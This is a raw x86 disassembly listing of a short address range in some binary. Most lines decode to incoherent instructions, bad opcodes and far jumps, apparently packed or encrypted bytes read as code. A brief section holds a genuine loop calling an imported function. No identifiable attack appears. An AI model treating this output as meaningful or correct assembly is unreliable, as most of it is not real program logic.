  415991:	sbb    al,0xd3
  415993:	fistp  QWORD PTR ss:[ebp-0x7b]
  415997:	iret   
  415998:	and    BYTE PTR [ebp-0x2cbe89b5],ch
  41599e:	cmp    bh,BYTE PTR [esi+0x2d897ed6]
  4159a4:	sbb    ch,BYTE PTR [ebp+0x14b82845]
  4159aa:	ss js  0x4159eb
  4159ad:	rcr    BYTE PTR [edx+eax*8+0x3d],1
  4159b1:	lds    ebp,FWORD PTR [ebx+0x73]
  4159b4:	cwde   
  4159b5:	fld    QWORD PTR [esi]
  4159b7:	mov    dl,0xfc
  4159b9:	push   0x57
  4159bb:	xchg   ecx,eax
  4159bc:	add    eax,0x850cb38e
  4159c1:	mov    dh,0x4a
  4159c3:	(bad)  
  4159c4:	xor    al,0x92
  4159c6:	retf   
  4159c7:	imul   ecx,edi,0x5bf1a275
  4159cd:	xchg   edi,eax
  4159ce:	sub    eax,DWORD PTR [ebx+0x32]
  4159d1:	cli    
  4159d2:	pop    ecx
  4159d3:	jmp    0xe097:0x1253ac57
  4159da:	sbb    ah,BYTE PTR [ebx]
  4159dc:	test   al,0xba
  4159df:	(bad)  
  4159e1:	daa    
  4159e2:	ror    bh,0xce
  4159e5:	scas   al,BYTE PTR es:[edi]
  4159e6:	add    al,0x35
  4159e8:	mov    ch,0x3f
  4159ea:	retf   0xe4b1
  4159ed:	pop    edi
  4159ee:	pop    es
  4159ef:	dec    esp
  4159f0:	out    0x98,al
  4159f2:	(bad)  
  4159f3:	test   esi,0x33f4251e
  4159f9:	pop    edi
  4159fa:	push   esp
  4159fb:	cmp    dh,BYTE PTR [ebx-0xcf3981e]
  415a01:	mov    esi,0x4a51351f
  415a06:	clc    
  415a07:	ins    BYTE PTR es:[edi],dx
  415a08:	push   esp
  415a09:	sub    DWORD PTR [eax],eax
  415a0b:	int    0x34
  415a0d:	lods   eax,DWORD PTR ds:[esi]
  415a0e:	stos   DWORD PTR es:[edi],eax
  415a0f:	cmp    dh,ch
  415a11:	cmp    eax,0xf4618067
  415a16:	repz sbb ch,BYTE PTR [esi]
  415a19:	mov    dh,0x6c
  415a1b:	push   esp
  415a1c:	mov    bl,0x90
  415a1e:	jl     0x415a2d
  415a20:	ins    BYTE PTR es:[edi],dx
  415a21:	and    BYTE PTR [edi-0x22],bh
  415a24:	mov    edx,0xaacaa47b
  415a29:	fist   DWORD PTR [ecx+0x3bb58ffe]
  415a2f:	add    eax,0x81e0883f
  415a34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a35:	pop    ebx
  415a36:	(bad)  
  415a37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a38:	popa   
  415a39:	mul    BYTE PTR [edx+0xb]
  415a3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a3d:	les    esi,FWORD PTR [esi+0x6e]
  415a40:	ss inc ebx
  415a42:	sub    bh,BYTE PTR [eax+0x24]
  415a45:	pop    ss
  415a46:	pop    ebp
  415a47:	add    BYTE PTR [ecx-0x68598c37],al
  415a4d:	mov    ebx,gs
  415a4f:	je     0x415a23
  415a51:	dec    edx
  415a52:	adc    DWORD PTR [esi+0x439566be],esi
  415a58:	hlt    
  415a59:	pop    edi
  415a5a:	xor    BYTE PTR [ebx],0xe
  415a5d:	outs   dx,BYTE PTR ds:[esi]
  415a5e:	lahf   
  415a5f:	ret    
  415a60:	mov    DWORD PTR [esi+0xc],ebp
  415a63:	movlps xmm5,QWORD PTR [esi+0x7258bf7f]
  415a6a:	pushf  
  415a6b:	push   ebp
  415a6c:	or     eax,0x90792c78
  415a71:	mov    esi,0x36a2d1d2
  415a76:	xchg   esi,eax
  415a77:	cdq    
  415a78:	sub    eax,0xed77d76d
  415a7d:	cmp    edi,DWORD PTR es:[edx+0x55]
  415a81:	sub    eax,0x68eea7c0
  415a86:	pushf  
  415a87:	rcr    ecx,0x8a
  415a8a:	mov    ebx,?
  415a8c:	mov    ds:0xe8eead82,eax
  415a91:	fist   DWORD PTR [ebx-0x7105221e]
  415a97:	stos   DWORD PTR es:[edi],eax
  415a98:	push   esp
  415a99:	fldenv [bp+si+0x4307]
  415a9e:	ds sahf 
  415aa0:	and    dh,BYTE PTR [ebx-0x70]
  415aa3:	and    DWORD PTR ds:0x113be474,0xb1d07ee1
  415aad:	push   eax
  415aae:	pop    esi
  415aaf:	push   esi
  415ab0:	int3   
  415ab1:	xor    BYTE PTR [esi+0x27],0xcb
  415ab5:	sti    
  415ab6:	jmp    0x1b187f42
  415abb:	mov    ds:0x3555b3f3,eax
  415ac0:	fbstp  TBYTE PTR [esi]
  415ac2:	in     al,dx
  415ac3:	pop    edx
  415ac4:	mov    bh,0x4d
  415ac6:	mul    DWORD PTR [ebx-0x9]
  415ac9:	or     al,0xa3
  415acb:	pop    ss
  415acc:	shl    BYTE PTR [eax+ebx*4],cl
  415acf:	cmp    eax,0xf6548953
  415ad4:	and    ch,ch
  415ad6:	pop    eax
  415ad7:	mov    eax,ds:0xc2ab83bb
  415adc:	(bad)  
  415add:	in     eax,dx
  415ade:	mov    al,0xdc
  415ae0:	or     al,0x30
  415ae2:	or     bl,BYTE PTR [ecx-0x146114ea]
  415ae8:	lea    esi,[eax-0x3a]
  415aeb:	jge    0x415aaa
  415aed:	js     0x415abb
  415aef:	mov    esi,0x12ee32ef
  415af4:	es (bad) 
  415af7:	ficomp DWORD PTR [ecx]
  415af9:	fistp  DWORD PTR [ebx+0x77a23bee]
  415aff:	repnz mov ecx,0x6eccfaf6
  415b05:	and    eax,0x3099ed8b
  415b0a:	mov    dh,0xdb
  415b0c:	cmp    DWORD PTR [edi+0x19],edx
  415b0f:	(bad)  
  415b10:	cs nop
  415b12:	ror    DWORD PTR es:[esi+0x295def80],cl
  415b19:	ret    0xcc2e
  415b1c:	clc    
  415b1d:	std    
  415b1e:	ins    DWORD PTR es:[edi],dx
  415b1f:	mov    dl,0xce
  415b21:	fdiv   QWORD PTR [edi+0x63]
  415b24:	dec    ebx
  415b25:	mov    esi,DWORD PTR [edx]
  415b27:	out    0x56,al
  415b29:	ins    BYTE PTR es:[edi],dx
  415b2a:	inc    eax
  415b2b:	adc    al,0x41
  415b2d:	scas   eax,DWORD PTR es:[edi]
  415b2e:	inc    ebx
  415b2f:	stos   BYTE PTR es:[edi],al
  415b30:	add    eax,0x359c096c
  415b35:	xor    eax,DWORD PTR [edi-0x3f]
  415b38:	mov    edx,DWORD PTR [ebp+0xc]
  415b3b:	xor    edx,esi
  415b3d:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  415b44:	mov    eax,DWORD PTR [ebp+0xc]
  415b47:	xor    eax,esi
  415b49:	add    eax,edi
  415b4b:	pop    edi
  415b4c:	pop    esi
  415b4d:	pop    ebx
  415b4e:	leave  
  415b4f:	ret    0x8
  415b52:	push   ebp
  415b53:	mov    ebp,esp
  415b55:	push   ecx
  415b56:	and    DWORD PTR ds:0x42701c,0x0
  415b60:	jmp    0x415b70
  415b65:	mov    eax,ds:0x42701c
  415b6a:	inc    eax
  415b6b:	mov    ds:0x42701c,eax
  415b70:	cmp    DWORD PTR ds:0x42701c,0x1b
  415b77:	jae    0x415bbd
  415b7d:	cmp    DWORD PTR ds:0x42701c,0x25
  415b84:	jne    0x415bb8
  415b8a:	push   0x5668
  415b8f:	push   DWORD PTR [ebp-0x24]
  415b92:	push   DWORD PTR [ebp-0x10]
  415b95:	push   DWORD PTR [ebp-0x20]
  415b98:	push   0x7cb6
  415b9d:	push   DWORD PTR [ebp-0x24]
  415ba0:	push   0x559a
  415ba5:	push   0x4b12
  415baa:	push   0x6519
  415baf:	push   DWORD PTR [ebp-0x28]
  415bb2:	call   DWORD PTR ds:0x421030
  415bb8:	jmp    0x415b65
  415bbd:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  415bc4:	adc    DWORD PTR ds:0x428008,ecx
  415bca:	mov    eax,DWORD PTR [ebp+0x8]
  415bcd:	add    DWORD PTR ds:0x425010,0x223f
  415bd7:	jmp    0x417f24
  415bdc:	into   
  415bdd:	or     al,0x6c
  415bdf:	jg     0x415c4d
  415be1:	fild   QWORD PTR [ebp-0x75]
  415be4:	dec    ebx
  415be5:	mov    ebp,0xff9618bc
  415bea:	lock lods eax,DWORD PTR ds:[esi]
  415bec:	or     eax,0x52626147
  415bf1:	pop    edi
  415bf2:	bound  esp,QWORD PTR [edx+0x27]
  415bf5:	nop
  415bf6:	lock or al,0x56
  415bf9:	cs pop ds
  415bfb:	jno    0x415c63
  415bfd:	dec    esi
  415bfe:	jne    0x415c7d
  415c00:	retf   0x4636
  415c03:	aad    0x56
  415c05:	adc    dl,BYTE PTR [eax+eiz*4-0x374657ce]
  415c0c:	lods   eax,DWORD PTR gs:[esi]
  415c0e:	cmp    al,0x95
  415c10:	mov    edx,0xaaa1a8fd
  415c15:	dec    edi
  415c16:	mov    edx,0x60bf02d4
  415c1b:	xor    cl,BYTE PTR [edi+0x37]
  415c1e:	sub    BYTE PTR [eax+0x7b07dec6],ah
  415c24:	add    al,0xd3
  415c26:	mov    BYTE PTR cs:[ebx-0x53],bl
  415c2a:	stc    
  415c2b:	scas   eax,DWORD PTR es:[edi]
  415c2c:	xor    eax,eax
  415c2e:	jecxz  0x415c0f
  415c30:	jmp    0x415c2f
  415c32:	sub    BYTE PTR [edi+0x38],bh
  415c35:	inc    edi
  415c36:	fcmovnbe st,st(4)
  415c38:	add    DWORD PTR ds:0xadda5e72,ebx
  415c3e:	inc    esi
  415c3f:	(bad)  
  415c40:	mul    DWORD PTR [edx]
  415c42:	aam    0x92
  415c44:	out    0x91,al
  415c46:	or     eax,0x31bc9fca
  415c4b:	addr16 ret 
  415c4d:	je     0x415c0c
  415c4f:	mov    ds:0xd69f1cfa,eax
  415c54:	pop    edx
  415c56:	adc    BYTE PTR [ecx-0x33],bh
  415c59:	xchg   edx,eax
  415c5a:	leave  
  415c5b:	push   esi
  415c5c:	and    eax,0x5809cfa5
  415c61:	ror    DWORD PTR gs:[esi+0x13acb690],1
  415c68:	adc    eax,0x4299b81e
  415c6d:	xor    al,0x4
  415c6f:	jecxz  0x415c4d
  415c71:	into   
  415c72:	xchg   cl,ch
  415c74:	xchg   ecx,eax
  415c75:	(bad)  
  415c76:	adc    esi,DWORD PTR [esi+edi*8+0x49fe9556]
  415c7d:	aam    0x1f
  415c7f:	xor    cl,BYTE PTR [eax+0x75]
  415c82:	adc    eax,0x925a43bc
  415c87:	inc    eax
  415c88:	mov    dh,0xa6
  415c8a:	bound  edx,QWORD PTR ss:[edi]
  415c8d:	int    0xf7
  415c8f:	ret    
  415c90:	imul   ebp,edi,0x9c421a63
  415c96:	cwde   
  415c97:	ror    BYTE PTR [esi+0x10],1
  415c9a:	pusha  
  415c9b:	fwait
  415c9c:	add    edi,0x658f5398
  415ca2:	add    al,0x56
  415ca4:	inc    esi
  415ca5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ca6:	mov    ds:0xf2c1d8ed,al
  415cab:	inc    edx
  415cac:	sbb    dl,BYTE PTR [edx]
  415cae:	or     DWORD PTR [edi+0x5a86d379],esi
  415cb4:	push   edi
  415cb5:	jmp    0x9d6d:0xd228174d
  415cbc:	outs   dx,BYTE PTR ds:[esi]
  415cbd:	mov    bh,dl
  415cbf:	jle    0x415c56
  415cc1:	sub    BYTE PTR [edx],bh
  415cc3:	jno    0x415c7e
  415cc5:	stos   BYTE PTR es:[edi],al
  415cc6:	stos   BYTE PTR es:[edi],al
  415cc7:	loope  0x415cc6
  415cc9:	mov    WORD PTR [esp+edx*1-0x61],ds
  415ccd:	or     esi,DWORD PTR [eax-0x13]
  415cd0:	pop    edx
  415cd1:	inc    eax
  415cd2:	inc    esp
  415cd3:	jnp    0x415c79
  415cd5:	leave  
  415cd6:	sub    cl,bl
  415cd8:	stos   DWORD PTR es:[edi],eax
  415cd9:	je     0x415d1f
  415cdb:	xchg   edx,eax
  415cdc:	push   esi
  415cdd:	repnz or ebp,DWORD PTR [ebx-0x1be96718]
  415ce4:	pusha  
  415ce5:	mov    esp,0xf403a577
  415cea:	mov    bl,0x94
  415cec:	pop    es
  415ced:	or     eax,0xea3f080b
  415cf2:	inc    ebp
  415cf3:	bound  esi,QWORD PTR [edx-0x270c3c38]
  415cf9:	rcl    BYTE PTR [edx+0x73b40d72],0xf3
  415d00:	dec    esi
  415d01:	loop   0x415cce
  415d03:	leave  
  415d04:	jne    0x415d59
  415d06:	bound  edi,QWORD PTR [ecx-0x4d893bd4]
  415d0c:	mov    ebx,0x27de03df
  415d11:	(bad)  
  415d13:	mov    edx,0x7b55712a
  415d18:	pop    esp
  415d19:	cmp    cl,al
  415d1b:	repz arpl WORD PTR [ecx],si
  415d1e:	cmp    al,0xdd
  415d20:	gs jle 0x415ce6
  415d23:	std    
  415d24:	add    al,BYTE PTR [ebx]
  415d26:	aaa    
  415d27:	push   es
  415d28:	sti    
  415d29:	fs in  al,dx
  415d2b:	jbe    0x415cb9
  415d2d:	les    esi,FWORD PTR [ebx+0x7d]
  415d30:	ror    DWORD PTR ds:0x410ae950,cl
  415d36:	loop   0x415dab
  415d38:	push   es
  415d39:	cli    
  415d3a:	mov    dl,0x66
  415d3c:	dec    ebx
  415d3d:	fistp  DWORD PTR ds:0xa835086f
  415d43:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d45:	ror    BYTE PTR [ebp+0x5685c758],cl
  415d4b:	cmp    eax,0xb1468203
  415d50:	push   ebp
  415d51:	int    0x5
  415d53:	fsubr  QWORD PTR [eax+eiz*2-0x23139409]
  415d5a:	popf   
  415d5b:	out    dx,eax
  415d5c:	mov    cl,BYTE PTR [ebp+0x613b1b30]
  415d62:	pop    esp
  415d63:	jp     0x415d30
  415d65:	cmp    al,BYTE PTR [eax+0x63]
  415d68:	mov    ch,0x94
  415d6a:	clc    
  415d6b:	and    bl,BYTE PTR [edx-0x2c597430]
  415d71:	xchg   BYTE PTR [eax+edx*4-0x1640c482],bl
  415d78:	xor    edi,DWORD PTR [ebx-0x5b5162c3]
  415d7e:	inc    ebx
  415d7f:	jp     0x415d03
  415d81:	xor    BYTE PTR [eax],dl
  415d83:	xchg   esp,eax
  415d84:	popf   
  415d85:	hlt    
  415d86:	lahf   
  415d87:	mov    edi,0xd1c14ed
  415d8c:	cli    
  415d8d:	jns    0x415e03
  415d8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d90:	xor    eax,0xba903ec6
  415d95:	aaa    
  415d96:	call   0xc91b381d
  415d9b:	fsub   st(6),st
  415d9d:	leave  
  415d9e:	fdivr  QWORD PTR [ecx+eax*1]
  415da1:	mov    ah,0x77
  415da3:	mov    ds:0xd118504b,eax
  415da8:	stc    
  415da9:	add    bh,cl
  415dab:	sbb    al,0x12
  415dad:	mov    esi,0xe47d7d21
  415db2:	push   edx
  415db3:	mov    ecx,0xfb077cc5
  415db8:	jecxz  0x415d71
  415dba:	call   0xb585f89a
  415dbf:	mov    ch,0xe3
  415dc1:	stc    
  415dc2:	xchg   esp,eax
  415dc3:	in     al,0x5f
  415dc5:	dec    ebp
  415dc6:	popf   
  415dc7:	les    edi,FWORD PTR [ebx+0x38acc6b5]
  415dcd:	mov    ds:0x3693ea7a,eax
  415dd2:	push   ds
  415dd3:	fcomp  DWORD PTR [edx]
  415dd5:	icebp  
  415dd6:	mov    ah,0x33
  415dd8:	imul   edi,esi,0xffffffa5
  415ddb:	push   ecx
  415ddc:	outs   dx,BYTE PTR ds:[esi]
  415ddd:	dec    esp
  415dde:	push   ecx
  415ddf:	les    ebx,FWORD PTR [eax+0x16b0e038]
  415de5:	call   0x724f:0x45c90d1c
  415dec:	(bad)  
  415ded:	in     al,dx
  415dee:	shl    BYTE PTR [ebx-0x6b0eab2a],1
  415df4:	jg     0x415dbe
  415df6:	fdivrp st(3),st
  415df8:	outs   dx,DWORD PTR ds:[esi]
  415df9:	dec    ecx
  415dfa:	fs jle 0x415e09
  415dfd:	pop    esi
  415dfe:	fdiv   DWORD PTR [esi]
  415e00:	xchg   ecx,eax
  415e01:	jne    0x415e20
  415e03:	pop    ds
  415e04:	fstp   DWORD PTR [edx]
  415e06:	mov    dh,0xb0
  415e08:	dec    esi
  415e09:	cmp    eax,0x2438e0f5
  415e0e:	aas    
  415e0f:	lods   eax,DWORD PTR ds:[esi]
  415e10:	pop    eax
  415e11:	je     0x415e63
  415e13:	cmp    eax,0xb427bbdf
  415e18:	mul    DWORD PTR ss:[ebx+eax*8-0x561cf387]
  415e20:	icebp  
  415e21:	mov    eax,0x7936c81a
  415e26:	cmp    al,0x51
  415e28:	fisub  WORD PTR [ecx+0x19]
  415e2b:	mov    WORD PTR [ebx],es
  415e2d:	pushf  
  415e2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e2f:	sub    BYTE PTR [ecx+0x3d353fa1],0xb0
  415e36:	call   0xe6361ec3
  415e3b:	scas   eax,DWORD PTR es:[edi]
  415e3c:	pop    ecx
  415e3d:	je     0x415e96
  415e3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e40:	add    al,0x87
  415e42:	push   ecx
  415e43:	jae    0x415e2a
  415e45:	jne    0x415e7f
  415e47:	and    edx,DWORD PTR [edi]
  415e49:	call   0x17b6:0xf49666a6
  415e50:	xor    dh,BYTE PTR [ecx-0x60da983e]
  415e56:	adc    BYTE PTR [edx],0x19
  415e59:	adc    bl,bl
  415e5b:	dec    ecx
  415e5c:	cdq    
  415e5d:	mov    ecx,0x515702a6
  415e62:	mov    esp,0x1a968cb2
  415e67:	fst    DWORD PTR [edi+0x74]
  415e6a:	mov    BYTE PTR [eax-0x79],0x72
  415e6e:	clc    
  415e6f:	jmp    0x3c410458
  415e74:	in     al,dx
  415e75:	cdq    
  415e76:	or     BYTE PTR [bx+di+0x6464],cl
  415e7b:	in     al,0x35
  415e7d:	jmp    0x2a1678d8
  415e82:	pushf  
  415e83:	add    bl,BYTE PTR [ebx-0x7b]
  415e86:	fmul   QWORD PTR [ebx-0x500b1a85]
  415e8c:	stos   BYTE PTR es:[edi],al
  415e8d:	dec    ebx
  415e8e:	mov    cl,0xe4
  415e90:	or     eax,0xd7c53902
  415e95:	stc    
  415e96:	sbb    DWORD PTR [eax+0x4f],eax
  415e99:	adc    DWORD PTR [edi],esp
  415e9b:	adc    ecx,esp
  415e9d:	jmp    0x2465:0x4f2a2610
  415ea4:	frstpm(287 only) 
  415ea6:	add    DWORD PTR ds:0xeabc4de1,0xffffffec
  415ead:	into   
  415eae:	fwait
  415eaf:	call   0xdc3c2b3c
  415eb4:	sub    dh,BYTE PTR [ebx+0x0]
  415eb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415eb8:	retf   
  415eb9:	mov    ds:0x5f325a30,eax
  415ebe:	outs   dx,BYTE PTR ds:[esi]
  415ebf:	push   esi
  415ec0:	repnz adc DWORD PTR gs:[ebx],esp
  415ec4:	xchg   esp,eax
  415ec5:	out    dx,eax
  415ec6:	sahf   
  415ec7:	pop    edx
  415ec8:	mov    ss,WORD PTR [ecx]
  415eca:	mov    esi,ecx
  415ecc:	adc    BYTE PTR es:[ebp+0x63dcc9e5],ch
  415ed3:	sbb    al,0xa6
  415ed5:	rcl    DWORD PTR [eax+edx*4-0x2d],0xe5
  415eda:	xchg   edx,eax
  415edb:	dec    ecx
  415edc:	dec    esp
  415edd:	dec    esi
  415ede:	inc    dh
  415ee0:	mul    BYTE PTR [edi+0x4743735]
  415ee6:	push   edi
  415ee7:	(bad)  
  415ee8:	iret   
  415ee9:	and    DWORD PTR [ecx+edx*1+0x29d50f4c],esp
  415ef0:	stos   BYTE PTR es:[edi],al
  415ef1:	sahf   
  415ef2:	clc    
  415ef3:	xchg   edx,eax
  415ef4:	mov    esi,0x3cd56808
  415ef9:	in     al,0x42
  415efb:	xchg   ebx,eax
  415efc:	fs out dx,eax
  415efe:	dec    esi
  415eff:	and    eax,0xe5832bc4
  415f04:	adc    DWORD PTR [edi],ebx
  415f06:	stos   DWORD PTR es:[edi],eax
  415f07:	in     eax,0x7c
  415f09:	mov    ss,WORD PTR [ebp-0x2738426c]
  415f0f:	and    edi,DWORD PTR [esi+eax*1]
  415f12:	jbe    0x415f7d
  415f14:	fist   DWORD PTR [edi-0xe]
  415f17:	jmp    0x415f82
  415f19:	jecxz  0x415f3d
  415f1b:	jle    0x415f10
  415f1d:	loop   0x415eee
  415f1f:	pop    ss
  415f20:	popa   
  415f21:	call   0x45c9632
  415f26:	icebp  
  415f27:	popf   
  415f28:	jge    0x415f70
  415f2a:	fincstp 
  415f2c:	xlat   BYTE PTR ds:[ebx]
  415f2d:	hlt    
  415f2e:	js     0x415ee5
  415f30:	fmul   DWORD PTR ds:0xfe36b577
  415f36:	pop    edx
  415f37:	and    cl,BYTE PTR [ecx+0x1f]
  415f3a:	cld    
  415f3b:	out    dx,al
  415f3c:	pop    ds
  415f3d:	test   DWORD PTR [ebp+eiz*8+0x31],edi
  415f41:	in     eax,0xe3
  415f43:	fisttp QWORD PTR [ebp-0x80]
  415f46:	sbb    eax,0xaf98d1f0
  415f4b:	fwait
  415f4c:	push   esp
  415f4d:	retf   0x527f
  415f50:	ror    DWORD PTR [eax-0x6da4cf41],1
  415f56:	jnp    0x415ee2
  415f58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f59:	lahf   
  415f5a:	or     esp,DWORD PTR [esi-0x61f5aaed]
  415f60:	xor    eax,0xc1e024cf
  415f66:	pop    edi
  415f67:	push   edx
  415f68:	mov    dl,0x69
  415f6a:	xchg   BYTE PTR cs:[ebx],bl
  415f6d:	fild   QWORD PTR [ebp+0x11edc1c6]
  415f73:	shl    DWORD PTR [ecx],0x1
  415f76:	shl    DWORD PTR [ebp-0x72d39741],0x9b
  415f7d:	mov    eax,0x6b2005dc
  415f82:	sar    BYTE PTR [eax+0x73],cl
  415f85:	xchg   cl,dl
  415f87:	sbb    dl,dh
  415f89:	cmp    bh,BYTE PTR [eax+0x20]
  415f8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f8d:	(bad)  [eax+0x4]
  415f90:	xchg   BYTE PTR [esi-0x71],bh
  415f93:	mov    ecx,0xcfd023b1
  415f98:	sahf   
  415f99:	(bad)  
  415f9a:	loop   0x415f71
  415f9c:	add    BYTE PTR ds:0x5a036539,bh
  415fa2:	xlat   BYTE PTR ds:[ebx]
  415fa3:	pushf  
  415fa4:	jns    0x415f8f
  415fa6:	pop    ecx
  415fa7:	rol    DWORD PTR [edi+0x3],0xe2
  415fab:	iret   
  415fac:	xor    al,0x29
  415fae:	xor    DWORD PTR [edx-0x36],ecx
  415fb1:	js     0x415fd4
  415fb3:	mov    eax,0x4c7b8933
  415fb8:	push   ds
  415fb9:	add    bh,0x6d
  415fbc:	sub    BYTE PTR [ebx+0x2b085064],0x28
  415fc3:	lods   al,BYTE PTR ds:[esi]
  415fc4:	pop    ecx
  415fc5:	scas   al,BYTE PTR es:[edi]
  415fc6:	sub    al,0xce
  415fc8:	xor    DWORD PTR [ebx+0x76f995a0],ebp
  415fce:	xchg   edx,eax
  415fcf:	call   DWORD PTR [eax-0x4745c042]
  415fd5:	pop    es
  415fd6:	ins    DWORD PTR es:[edi],dx
  415fd7:	mov    eax,ds:0xb21982d2
  415fdc:	pop    edi
  415fdd:	sbb    BYTE PTR [esp+ebx*8],al
  415fe0:	xlat   BYTE PTR ds:[ebx]
  415fe1:	sbb    BYTE PTR [ecx+0x39],dl
  415fe4:	or     eax,ebx
  415fe6:	or     esi,DWORD PTR [eax]
  415fe8:	cdq    
  415fe9:	(bad)  
  415fea:	fcomp  DWORD PTR [esi-0x47db7ab1]
  415ff0:	cld    
  415ff1:	mov    ecx,0x6b44e6e3
  415ff6:	cld    
  415ff7:	and    cl,dh
  415ff9:	retf   
  415ffa:	cmp    edx,ebp
  415ffc:	inc    edx
  415ffd:	in     al,0xde
  415fff:	jle    0x415fbc
  416001:	lea    ebx,[edi]
  416003:	out    0x57,al
  416005:	stos   BYTE PTR es:[edi],al
  416006:	daa    
  416007:	push   cs
  416008:	call   ecx
  41600a:	push   ebp
  41600b:	dec    edx
  41600c:	imul   edx,eax,0x5b94fcb0
  416012:	stos   DWORD PTR es:[edi],eax
  416013:	cmp    al,BYTE PTR [ebx+0x75c3a7a0]
  416019:	mov    ebp,0x62977db
  41601e:	add    ebx,DWORD PTR [eax+ebx*2]
  416021:	cmc    
  416022:	les    esp,FWORD PTR [ecx+0x19f944df]
  416028:	lods   al,BYTE PTR ds:[esi]
  416029:	out    0x32,al
  41602b:	scas   al,BYTE PTR es:[edi]
  41602c:	push   edi
  41602d:	sub    cl,BYTE PTR [eax-0x2]
  416030:	pushf  
  416031:	mov    eax,0x1f21b61a
  416036:	iret   
  416037:	je     0x4160ad
  416039:	out    0x23,eax
  41603b:	and    al,0x80
  41603d:	jnp    0x416049
  41603f:	mov    ecx,0x18e0aaf7
  416044:	push   ebp
  416045:	jecxz  0x416011
  416047:	and    bh,BYTE PTR gs:[ecx-0x5c]
  41604b:	mov    edx,0xa553c0cc
  416050:	xor    eax,0x282924a
  416055:	out    dx,eax
  416056:	cmp    BYTE PTR [edi+0x4202eb8b],dh
  41605c:	mov    bx,0xa0f3
  416060:	pop    edx
  416061:	les    esi,FWORD PTR [ecx-0x5c20475b]
  416067:	icebp  
  416068:	sbb    BYTE PTR [esi-0x2b],ch
  41606b:	sub    eax,0xfe2da550
  416070:	jecxz  0x41609d
  416072:	fdivr  QWORD PTR es:[edi]
  416075:	stos   DWORD PTR es:[edi],eax
  416076:	(bad)  
  416077:	(bad)  
  416078:	out    dx,al
  416079:	in     al,dx
  41607a:	stos   BYTE PTR es:[edi],al
  41607b:	pushf  
  41607c:	inc    edx
  41607d:	push   esi
  41607e:	mov    al,0x61
  416080:	in     eax,dx
  416081:	xchg   esp,eax
  416082:	jns    0x416006
  416084:	and    ch,bh
  416086:	mov    edi,0xfe9019f8
  41608b:	scas   eax,DWORD PTR es:[edi]
  41608c:	fsub   st,st(6)
  41608e:	mov    eax,ds:0xcd34aee9
  416093:	out    dx,eax
  416094:	or     edi,ebx
  416096:	mov    ebp,DWORD PTR ds:0xaa0d992d
  41609c:	and    ebx,edi
  41609e:	retf   0xf24e
  4160a1:	dec    edi
  4160a2:	push   ebx
  4160a3:	mov    dh,0xc8
  4160a5:	lds    edx,FWORD PTR es:[ecx+eax*2]
  4160a9:	mul    BYTE PTR [esi]
  4160ab:	test   DWORD PTR [ebx-0x390debb7],ecx
  4160b1:	mov    dl,0x7d
  4160b3:	jmp    0xa0b0c0ba
  4160b8:	or     esp,edx
  4160ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160bb:	mov    edx,ss
  4160bd:	outs   dx,DWORD PTR ds:[esi]
  4160be:	loopne 0x41609c
  4160c0:	mov    ch,0xa
  4160c2:	in     eax,0x19
  4160c4:	sbb    eax,0x5035371e
  4160c9:	jb     0x41607e
  4160cb:	push   es
  4160cc:	aas    
  4160cd:	dec    eax
  4160ce:	loopne 0x416127
  4160d0:	adc    cl,al
  4160d2:	int    0x88
  4160d4:	jnp    0x416127
  4160d6:	bnd jnp 0x41611c
  4160d9:	jecxz  0x416137
  4160db:	cmp    esp,0x6f5c2bd
  4160e1:	scas   al,BYTE PTR es:[edi]
  4160e2:	(bad)  fs:[eax]
  4160e5:	pop    ebx
  4160e6:	dec    edx
  4160e7:	jecxz  0x41615b
  4160e9:	pop    es
  4160ea:	xchg   ebx,eax
  4160eb:	and    eax,0x709d8af5
  4160f0:	out    0x50,eax
  4160f2:	inc    ebp
  4160f3:	dec    ebx
  4160f4:	cmp    BYTE PTR [esi+0x64a71483],bl
  4160fa:	ins    BYTE PTR es:[edi],dx
  4160fb:	mul    DWORD PTR [eax]
  4160fd:	clc    
  4160fe:	pop    eax
  4160ff:	jae    0x416087
  416101:	div    DWORD PTR [edi+0x3fa17104]
  416107:	int3   
  416108:	add    DWORD PTR [esi+edi*2+0x68],edi
  41610c:	jle    0x4160a4
  41610e:	mov    esi,DWORD PTR [ebx]
  416110:	mov    dl,BYTE PTR [edi+0x7ab531f1]
  416116:	daa    
  416117:	push   0xb4703469
  41611c:	sbb    ch,BYTE PTR [ebx]
  41611e:	jne    0x416176
  416120:	rcl    ecx,0x59
  416123:	or     ecx,ebp
  416125:	jl     0x416111
  416127:	imul   ebx,DWORD PTR [esi],0xb
  41612a:	push   0x22
  41612c:	dec    DWORD PTR ds:0x9af4a379
  416132:	imul   ecx,DWORD PTR ds:0x5c3475d1,0xffffff9d
  416139:	repz pop ss
  41613b:	jle    0x4161ba
  41613d:	jno    0x41616b
  41613f:	out    dx,al
  416140:	or     al,ah
  416142:	lea    esp,[esi-0x37]
  416145:	mov    ebp,0xeb883ba4
  41614a:	lock and DWORD PTR [edx-0x46dcb236],esi
  416151:	call   0xe79f9033
  416156:	imul   ebp,ebx,0x32
  416159:	aas    
  41615a:	gs sar bl,1
  41615d:	outs   dx,BYTE PTR ds:[esi]
  41615e:	and    eax,DWORD PTR [edx-0x4fa25ebb]
  416164:	fbstp  TBYTE PTR [edi-0x58]
  416167:	jbe    0x4161a2
  416169:	and    eax,DWORD PTR [edx+0x284ecca4]
  41616f:	sub    al,0xaa
  416171:	popa   
  416172:	(bad)  
  416173:	xor    dh,BYTE PTR [ebx]
  416175:	shl    BYTE PTR [ebp+0x7b452955],1
  41617b:	push   0xb
  41617d:	cmp    BYTE PTR [ebx],ah
  41617f:	mov    ds:0x84f45746,al
  416184:	push   cs
  416185:	mov    bh,BYTE PTR [ecx-0x251fef29]
  41618b:	push   ds
  41618c:	inc    esp
  41618d:	mov    bl,0x9a
  41618f:	iret   
